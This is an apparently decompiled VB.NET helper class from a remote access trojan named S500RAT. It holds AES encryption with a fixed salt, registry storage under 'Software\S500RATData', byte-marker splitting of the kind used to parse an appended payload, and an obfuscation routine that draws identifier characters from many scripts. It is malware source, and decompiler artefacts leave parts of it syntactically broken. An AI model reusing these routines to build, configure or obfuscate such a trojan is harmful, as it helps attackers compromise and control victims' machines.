Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Linq
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports S500RAT.My

Namespace S500RAT
	' Token: 0x0200006B RID: 107
	Public Class Functions
		' Token: 0x060011E0 RID: 4576 RVA: 0x0009FEDC File Offset: 0x0009E0DC
		Public Shared Function FilesType(Type As String) As Object
			Dim flag As Boolean = Operators.CompareString(Type, ".vb", False) = 0
			Dim result As Object
			If flag Then
				result = "Visual Basic Source File"
			Else
				Dim flag2 As Boolean = Operators.CompareString(Type, ".tmp", False) = 0
				If flag2 Then
					result = "TMP File"
				Else
					Try
						Dim classesRoot As RegistryKey = Registry.ClassesRoot
						Dim registryKey As RegistryKey = classesRoot.OpenSubKey(Type, False)
						Dim name As String = Conversions.ToString(registryKey.GetValue("", ""))
						Dim registryKey2 As RegistryKey = classesRoot.OpenSubKey(name)
						Dim text As String = Conversions.ToString(registryKey2.GetValue("", ""))
						registryKey2.Close()
						registryKey.Close()
						classesRoot.Close()
						result = text
					Catch ex As Exception
						result = Nothing
					End Try
				End If
			End If
			Return result
		End Function

		' Token: 0x060011E1 RID: 4577 RVA: 0x0009FFB0 File Offset: 0x0009E1B0
		Public Shared Function CheckPathChard(Path As String) As Boolean
			Dim predicate As Func(Of Char, Boolean)
			If Functions._Closure$__.$I5-0 IsNot Nothing Then
				predicate = Functions._Closure$__.$I5-0
			Else
				Dim func As Func(Of Char, Boolean) = Function(c As Char) Functions.GetInvalidPathChars.Contains(c)
				predicate = func
				Functions._Closure$__.$I5-0 = func
			End If
			Return Path.Any(predicate)
		End Function

		' Token: 0x060011E2 RID: 4578 RVA: 0x0009FFEC File Offset: 0x0009E1EC
		Public Shared Function AES_EncryptText(input As String, password As String) As String
			Dim bytes As Byte() = Encoding.UTF8.GetBytes(input)
			Dim array As Byte() = Encoding.UTF8.GetBytes(password)
			array = SHA256.Create().ComputeHash(array)
			Dim inArray As Byte() = Functions.AES_Encrypt(bytes, array)
			Return Convert.ToBase64String(inArray)
		End Function

		' Token: 0x060011E3 RID: 4579 RVA: 0x000A0034 File Offset: 0x0009E234
		Public Shared Function AES_Encrypt(bytesToBeEncrypted As Byte(), passwordBytes As Byte()) As Byte()
			Dim result As Byte() = Nothing
			Dim salt As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 }
			Using memoryStream As MemoryStream = New MemoryStream()
				Using rijndaelManaged As RijndaelManaged = New RijndaelManaged()
					rijndaelManaged.KeySize = 256
					rijndaelManaged.BlockSize = 128
					Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(passwordBytes, salt, 1000)
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(CInt(Math.Round(CDbl(rijndaelManaged.KeySize) / 8.0)))
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(CInt(Math.Round(CDbl(rijndaelManaged.BlockSize) / 8.0)))
					rijndaelManaged.Mode = CipherMode.CBC
					Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write)
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
						cryptoStream.Close()
					End Using
					result = memoryStream.ToArray()
				End Using
			End Using
			Return result
		End Function

		' Token: 0x060011E4 RID: 4580 RVA: 0x000A016C File Offset: 0x0009E36C
		Public Shared Function AES_DecryptText(input As String, Key As String) As String
			Dim bytesToBeDecrypted As Byte() = Convert.FromBase64String(input)
			Dim array As Byte() = Encoding.UTF8.GetBytes(Key)
			array = SHA256.Create().ComputeHash(array)
			Dim bytes As Byte() = Functions.AES_Decrypt(bytesToBeDecrypted, array)
			Return Encoding.UTF8.GetString(bytes)
		End Function

		' Token: 0x060011E5 RID: 4581 RVA: 0x000A01B4 File Offset: 0x0009E3B4
		Public Shared Function AES_Decrypt(bytesToBeDecrypted As Byte(), KeydBytes As Byte()) As Byte()
			Dim result As Byte() = Nothing
			Dim salt As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 }
			Using memoryStream As MemoryStream = New MemoryStream()
				Using rijndaelManaged As RijndaelManaged = New RijndaelManaged()
					rijndaelManaged.KeySize = 256
					rijndaelManaged.BlockSize = 128
					Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(KeydBytes, salt, 1000)
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(CInt(Math.Round(CDbl(rijndaelManaged.KeySize) / 8.0)))
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(CInt(Math.Round(CDbl(rijndaelManaged.BlockSize) / 8.0)))
					rijndaelManaged.Mode = CipherMode.CBC
					Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write)
						cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length)
						cryptoStream.Close()
					End Using
					result = memoryStream.ToArray()
				End Using
			End Using
			Return result
		End Function

		' Token: 0x060011E6 RID: 4582 RVA: 0x000A02EC File Offset: 0x0009E4EC
		Public Shared Function Get_BytesDefault(ByRef text As String) As Byte()
			Return Encoding.[Default].GetBytes(text)
		End Function

		' Token: 0x060011E7 RID: 4583 RVA: 0x000A030C File Offset: 0x0009E50C
		Public Shared Function Get_StringsDefault(ByRef bytes As Byte()) As String
			Return Encoding.[Default].GetString(bytes)
		End Function

		' Token: 0x060011E8 RID: 4584 RVA: 0x000A032C File Offset: 0x0009E52C
		Public Shared Function Get_Byte(ByRef text As String) As Byte()
			Return Encoding.UTF8.GetBytes(text)
		End Function

		' Token: 0x060011E9 RID: 4585 RVA: 0x000A034C File Offset: 0x0009E54C
		Public Shared Function Get_String(ByRef bytes As Byte()) As String
			Return Encoding.UTF8.GetString(bytes)
		End Function

		' Token: 0x060011EA RID: 4586 RVA: 0x000A036C File Offset: 0x0009E56C
		Public Shared Function DencryptBase64ToString(ByRef s As String) As String
			Return Encoding.UTF8.GetString(Convert.FromBase64String(s))
		End Function

		' Token: 0x060011EB RID: 4587 RVA: 0x000A0390 File Offset: 0x0009E590
		Public Shared Function StringToBase64(ByRef text As String) As String
			Return Convert.ToBase64String(Encoding.UTF8.GetBytes(text))
		End Function

		' Token: 0x060011EC RID: 4588 RVA: 0x000A03B4 File Offset: 0x0009E5B4
		Public Shared Function RegistryGetValue(Name As String, Value As String) As String
			Dim result As String = Nothing
			Try
				result = Conversions.ToString(RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\S500RATData").GetValue(Name, Value)))
			Catch ex As Exception
				Console.WriteLine("Faild : GetValue!")
			End Try
			Return result
		End Function

		' Token: 0x060011ED RID: 4589 RVA: 0x000A0424 File Offset: 0x0009E624
		Public Shared Sub RegistrySetValue(Name As String, Value As String)
			Dim flag As Boolean = Operators.CompareString(Value, Nothing, False) = 0
			If flag Then
				Value = String.Empty
			End If
			Try
				MyProject.Computer.Registry.CurrentUser.CreateSubKey("Software\S500RATData").SetValue(Name, Value)
			Catch ex As Exception
				Console.WriteLine("Faild : SetValue!")
			End Try
		End Sub

		' Token: 0x060011EE RID: 4590 RVA: 0x000A049C File Offset: 0x0009E69C
		Public Shared Function WriteArray(bytes As Byte(), Text As String) As Array
			Dim list As List(Of Byte()) = New List(Of Byte())()
			Dim num As Integer = Array.IndexOf(Of Byte)(bytes, CByte(Strings.Asc(Text(0))))
			While True
				Dim flag As Boolean = Not(num > -1 And num + Text.Length <= bytes.Length)
				If flag Then
					Exit For
				End If
				Dim array As Byte() = New Byte(Text.Length - 1 + 1 - 1 + 1 - 1) {}
				Dim num2 As Integer = 0
				Dim num3 As Integer = num + Text.Length - 1
				For i As Integer = num To num3
					array(num2) = bytes(i)
					num2 += 1
				Next
				Dim flag2 As Boolean = Operators.CompareString(Functions.Get_String(array), Text, False) = 0
				If flag2 Then
					GoTo Block_3
				End If
				num = Array.IndexOf(Of Byte)(bytes, CByte(Strings.Asc(Text(0))), num + 1)
			End While
			GoTo IL_12C
			Block_3:
			Dim memoryStream As MemoryStream = New MemoryStream()
			memoryStream.Write(bytes, 0, num)
			list.Add(memoryStream.ToArray())
			memoryStream.Dispose()
			memoryStream = New MemoryStream()
			memoryStream.Write(bytes, num + Text.Length, bytes.Length - (num + Text.Length))
			list.Add(memoryStream.ToArray())
			memoryStream.Dispose()
			IL_12C:
			Dim flag3 As Boolean = list.Count = 0
			If flag3 Then
				list.Add(bytes)
			End If
			Return list.ToArray()
		End Function

		' Token: 0x060011EF RID: 4591
		Friend Declare Function SetProcessWorkingSetSize32Bit Lib "KERNEL32.DLL" Alias "SetProcessWorkingSetSize" (pProcess As IntPtr, dwMinimumWorkingSetSize As Integer, dwMaximumWorkingSetSize As Integer) As Boolean

		' Token: 0x060011F0 RID: 4592 RVA: 0x000A05F8 File Offset: 0x0009E7F8
		Public Shared Function BytesToSize(byteCount As Long) As String
			Dim array As String() = New String() { "B", "KB", "MB", "GB", "TB", "PB", "EB" }
			Dim flag As Boolean = byteCount = 0L
			Dim result As String
			If flag Then
				result = "0" + array(0)
			Else
				Dim num As Long = Math.Abs(byteCount)
				Dim num2 As Integer = Convert.ToInt32(Math.Floor(Math.Log(CDbl(num), 1024.0)))
				Dim num3 As Double = Math.Round(CDbl(num) / Math.Pow(1024.0, CDbl(num2)), 1)
				result = (CDbl(Math.Sign(byteCount)) * num3).ToString() + array(num2)
			End If
			Return result
		End Function

		' Token: 0x060011F1 RID: 4593 RVA: 0x000A06BC File Offset: 0x0009E8BC
		Public Shared Function GetRandomString(length As Integer) As String
			Dim stringBuilder As StringBuilder = New StringBuilder(length)
			Dim num As Integer = length - 1
			For i As Integer = 0 To num
				stringBuilder.Append("ASDFGHJklQWERTYUIOPMnBVCXZ"(Functions.Random.[Next]("ASDFGHJklQWERTYUIOPMnBVCXZ".Length)))
			Next
			Return stringBuilder.ToString()
		End Function

		' Token: 0x060011F2 RID: 4594 RVA: 0x000A0710 File Offset: 0x0009E910
		Public Shared Function ObfusctionRandom(Language As String) As Object
			Dim result As String = ""
			Try
				Dim flag As Boolean = Operators.CompareString(Language, "Urdu", False) = 0
				If flag Then
					result = "قوعرتےءیہپلکجحگفدسازشچطبنمّْٰڑٹَئِۃُآصڈغھضخذژثظںّْٰٹ"
				Else
					Dim flag2 As Boolean = Operators.CompareString(Language, "Armenian", False) = 0
					If flag2 Then
						result = "խւէրտեըիոպչջթլկճհքֆդսացգշԶՑԳԴՏԵԸԻՈՊՉՓԹԼԿՃՀՔՖԴՍԾՂՇՄ"
					Else
						Dim flag3 As Boolean = Operators.CompareString(Language, "Amharic", False) = 0
						If flag3 Then
							result = "ቅወርትዩኢኦፕልክጅህግፍድሳዝሽችቭብንምቅዌርጥዩኦጵልኽጅሕግፍድጽዥሽጭቭብኝምዐ"
						Else
							Dim flag4 As Boolean = Operators.CompareString(Language, "National Valleys", False) = 0
							If flag4 Then
								result = "ୌୈାୀୂବହଗଦଜଡୋେ୍ିୁପରକତଚଟ୆ଂମନଔଐଆଈଊଭଙଘଧଝଢଓଏଅଇଉଫ଱ଖଥଛଣଳଷଶୟ"
							Else
								Dim flag5 As Boolean = Operators.CompareString(Language, "Uzbek Cyrillic", False) = 0
								If flag5 Then
									result = "явертыуиопшщасдфгчйклзхцжбЯВЕРТЫУИОПШЩАСДФГЧЙКЛЗХЦЖБ"
								Else
									Dim flag6 As Boolean = Operators.CompareString(Language, "Punjabi", False) = 0
									If flag6 Then
										result = "ੌੈਾੀੂਬਹਗਦਜਡੋੇ੍ਿੁਪਰਕਤਚਟ੆ਂਮਨਔਐਆਈਊਭਙਘਧਝਢਞਓਏਅਇਉਫ਱ਖਥਛ਎ਁਣ਩"
									Else
										Dim flag7 As Boolean = Operators.CompareString(Language, "bangla", False) = 0
										If flag7 Then
											result = "ৌৈাীূবহগদজডোে্িুপরকতচট৆ংমনঔঐআঈঊভঙঘধঝঢঞওএঅইউফ঱খথছঠ঎ঁণ"
										Else
											Dim flag8 As Boolean = Operators.CompareString(Language, "Burmese", False) = 0
											If flag8 Then
												result = "ဆတနမအပငသစဟဩ၏‌ေျိ်ါ့ြုူးဖထညဈဝဣ၎ဤ၌ဥ၍ဿဏဧဪဗှီ္ွံဲဒဓးဌဃဠဦ"
											Else
												Dim flag9 As Boolean = Operators.CompareString(Language, "Tamil 99", False) = 0
												If flag9 Then
													result = "ஆஈஊஐஏளறனடணசஞ‍இஉ்எகபமதநயௌஓரஸஷஜஹஸ்ரீக்ஷ௹௺௸ஃ௳௴௵௶௷ஒஓவழரயௌடமௌூ"
												Else
													Dim flag10 As Boolean = Operators.CompareString(Language, "thai", False) = 0
													If flag10 Then
														result = "ๆไำพะัีรนยญบลฃฟหกญดเ้าญสวงผปแ๐ญฎฑํณญฯญฐฅฮญฉฬฒฦซญศษ๋็ฌโฏฆฤฦ"
													Else
														Dim flag11 As Boolean = Operators.CompareString(Language, "Telugu", False) = 0
														If flag11 Then
															result = "ౌైాీూబహగదజడోే్ిుపరకతచటయసలవఔఐఆఈఊభఙఘధఝఢఞఓఏఅఇఉఫఱఖథఛఠ౟శళ"
														Else
															Dim flag12 As Boolean = Operators.CompareString(Language, "Georgian", False) = 0
															If flag12 Then
																result = "ღჯუკენგშწზხცჟდლორპათვძფჭჩყქწერტყუიოპლკჯჰგფდსაზხცვბნმ"
															Else
																Dim flag13 As Boolean = Operators.CompareString(Language, "Khmer", False) = 0
																If flag13 Then
																	result = "ឆឹេរតយុិោផៀើលក្ហងថដសាឋខចវបឈែឬទួូីៅភឿឧឭោះឡគញះអធឌៃាំឍឃជេណ"
																Else
																	Dim flag14 As Boolean = Operators.CompareString(Language, "Sinhala", False) = 0
																	If flag14 Then
																		result = "ුඇරඑහමසදචඤ්ිාටෙයවනකතංජඩඉබූඋෑඍඔශඹෂධඡඥෟීෘෆඨ්‍යණඛථඞඣඪඊභඵ"
																	Else
																		Dim flag15 As Boolean = Operators.CompareString(Language, "Chinese", False) = 0
																		If flag15 Then
																			result = "手田水口廿卜山戈人心中大十竹土火木尸日Ｚ難金女月弓。彪灶脊脆盎恰道圻精忠年态铼泅荒坻"
																		Else
																			Dim flag16 As Boolean = Operators.CompareString(Language, "Tajik", False) = 0
																			If flag16 Then
																				result = "йқукенгшҳзфҷвапролджячсмитЙҚУКЕНГШҲЗХФҶВАПРОЛДЖЯЧСМИ"
																			Else
																				Dim flag17 As Boolean = Operators.CompareString(Language, "Hebrew", False) = 0
																				If flag17 Then
																					result = "קראטוןםפשדגכעיחלךףזסבהנמצתQWERTUIOPLKJHGFDSAZXCVBNM"
																				Else
																					Dim flag18 As Boolean = Operators.CompareString(Language, "Gujarati", False) = 0
																					If flag18 Then
																						result = "ૌૈાીૂબહદજોે્િુપરકતચટ૆ંમનવલસઔઐઆઈઊભઙઘધઝઢઓએઅઇઉફ઱ખથછ઎ઁણ઩શ"
																					Else
																						Dim flag19 As Boolean = Operators.CompareString(Language, "kannada", False) = 0
																						If flag19 Then
																							result = "ೌೈಾೀೂಬಹಗದಜಡಟಚತಕರಪುಿ್ೇೋೆಂಮನಔಐಆಈಊಭಙಘಧಝಢಞಠಛಥಖಱಫಉಇಅಏಓಎಣಷ"
																						Else
																							Dim flag20 As Boolean = Operators.CompareString(Language, "korean", False) = 0
																							If flag20 Then
																								result = "ㅂㅈㄷㄱ쇼ㅕㅑㅐㅔㅁㄴㅇㄹ호ㅓㅏㅣㅋㅌㅊ퓨ㅜㅡㅃㅉㄸㄲ쑈ㅕㅑㅒㅖㅁㄴㅇㄹ호ㅓㅏㅣㅋㅌㅊ퓨ㅜㅡ"
																							Else
																								Dim flag21 As Boolean = Operators.CompareString(Language, "Lao", False) = 0
																								If flag21 Then
																									result = "ໄົຳພະິີຮນຍັຫກດເ້່າສວຜປແອຶືົ້0ຳ້ິ້ີ້ຣຽຫຼັ້໊₭ຯxຶ້ື້ໆໝຝໃມທລງຜົຟໂ"
																								Else
																									Dim flag22 As Boolean = Operators.CompareString(Language, "malayalam", False) = 0
																									If flag22 Then
																										result = "ൊൗൈാീൂബഹഗദജോേ്ിുപരകതചെംമനവഔഐആഈഊഭങഘധഝഢഞഓഏഅഇഉഫറഖഥഛഠൟൽഷ"
																									Else
																										Dim flag23 As Boolean = Operators.CompareString(Language, "maharani", False) = 0
																										If flag23 Then
																											result = "क़्वेर्त्युइओप्स्द्फ़्घ्ज्क्ल्श्क्ष्च्व्ब्न्म१२३४५६अस्द्फ़्घ्च्देत्य्दह्तेरुव"
																										Else
																											Dim flag24 As Boolean = Operators.CompareString(Language, "Nepali", False) = 0
																											If flag24 Then
																												result = "त्रधभचतथगषयउर्ेबकमानजवपिसुशहअखदलत्तड्ढऐद्वट्टठ्ठऊक्षइएैआङ्कङ्गँद्दझोफीट्ठूं"
																											Else
																												Dim flag25 As Boolean = Operators.CompareString(Language, "Indian", False) = 0
																												If flag25 Then
																													result = "ॊोे्िुपरकतचटॉ़डजदगहबूीांमसऒऔऐआईऊभङघधझढछथखऱफउइअणऩऴळशष"
																												Else
																													Dim flag26 As Boolean = Operators.CompareString(Language, "Greek", False) = 0
																													If flag26 Then
																														result = "ςερτυθιοπασδφγηξκλζχψωβνμμ΅ΕΡΤΥΘΙΟΠΑΣΔΦΓΗΞΚΛΖΧΨΩΒΝΜΨ"
																													Else
																														Dim flag27 As Boolean = Operators.CompareString(Language, "Japanese", False) = 0
																														If flag27 Then
																															result = "あぁかさたなにちしきぃいうぅすゆゅるむふもぼぽぴばわゔっんほはまやゃらゐぎじぢびぴぷぶづずぐゑげぜでべぺ"
																														Else
																															Dim flag28 As Boolean = Operators.CompareString(Language, "Einglish", False) = 0
																															If flag28 Then
																																result = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
																															End If
																														End If
																													End If
																												End If
																											End If
																										End If
																									End If
																								End If
																							End If
																						End If
																					End If
																				End If
																			End If
																		End If
																	End If
																End If
															End If
														End If
													End If
												End If
											End If
										End If
									End If
								End If
							End If
						End If
					End If
				End If
			Catch ex As Exception
			End Try
			Return result
		End Function

		' Token: 0x040007E4 RID: 2020
		Public Shared long_0 As Long = 0L

		' Token: 0x040007E5 RID: 2021
		Public Shared GetInvalidPathChars As Char() = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray()

		' Token: 0x040007E6 RID: 2022
		Private Const Alphabet As String = "ASDFGHJklQWERTYUIOPMnBVCXZ"

		' Token: 0x040007E7 RID: 2023
		Public Shared Random As Random = New Random()
	End Class
End Namespace
